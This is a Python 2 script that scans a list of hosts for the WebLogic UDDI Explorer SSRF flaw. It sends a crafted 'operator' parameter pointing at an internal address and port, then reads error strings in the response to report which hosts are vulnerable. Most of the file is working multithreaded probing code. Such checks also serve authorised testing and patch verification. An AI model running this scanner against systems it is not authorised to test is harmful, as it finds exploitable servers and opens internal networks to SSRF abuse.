
#coding=utf-8
import urllib2
import threading,Queue,sys
import getopt


def usage():
    helpmsg = '''\
Weblogic UDDI Check
Usage: w_uddi.py InputFilename
        InputFile Example:
            linux   10.0.0.1 7001
            windows 10.0.0.2 8002
'''
    print helpmsg
    sys.exit()

class W_UDDI(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self._queue = queue
        self._headers = {"User-Agent":"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0","Content-Type":"text/xml"} 
        
    def run(self):
        while True:
            if self._queue.empty():
                break
            try:
                strIP_Port_Ver = self._queue.get(timeout=0.5)
                self.w_uddi(strIP_Port_Ver)
            except:
                continue

    def w_uddi(self,ip_port_ver):
        target_list = ip_port_ver.split()
        if len(target_list)  != 3:
          return

        version = target_list[0]   #unused
        ip = target_list[1]
        port = target_list[2]
        
        strIP = ip+":"+str(port)
        url = "http://"+strIP+"/uddiexplorer/SearchPublicRegistries.jsp"

        try:
            request = urllib2.Request(url,headers=self._headers)
            response = urllib2.urlopen(request)
            page = response.read()
            code = response.getcode()
            #print code
            if code == 200:
                self.w_ssrf(url)
        except urllib2.URLError,e:  
            strResp=str(e.code)+' ======= '+url+'\n'
            sys.stdout.write(strResp+'\n')
    
    def w_ssrf(self,url):
        strPar ="?operator=http://X.x.x.x:22&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&\
selfor=Business+location&btnSubmit=Search"
        ssrf_url = url+strPar
        try:
            request = urllib2.Request(ssrf_url,headers=self._headers)
            response = urllib2.urlopen(request)
            page = response.read()
            code = response.getcode()
            found = False
            for strKey in ('Connection refused','Received a response from','could not connect over HTTP to server','Response contained no data'):
                start_pos = page.find(strKey)
                if start_pos >= 0:
                    found = True
                    sys.stdout.write('SSRF    --->'+url +'   '+page[start_pos:start_pos+60] + '\n')
                    #sys.stdout.write(url+'\n'+page[start_pos:start_pos+60] +'\n\n') 
                    break
            if found == False:
                sys.stdout.write('NOSSRF  --->'+url + '\n')
        except urllib2.URLError,e:  
                    sys.stdout.write('ERROR   --->'+url + '\n')

def main():    
    if 1 != len(sys.argv[1:]):
    	print len(sys.argv[1:]) 
        usage()

    thread_count = 20
    threads = []
    queue = Queue.Queue()

    file = sys.argv[1]
    fh = open(file,'r')
    lines = fh.readlines()
    for line in lines:
        line = line.strip()
        if (line == '' or line[0] == '#'):
            continue
        queue.put(line)
    fh.close()

    for i in xrange(thread_count):
        threads.append(W_UDDI(queue))

    for t in threads:
        t.start()

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()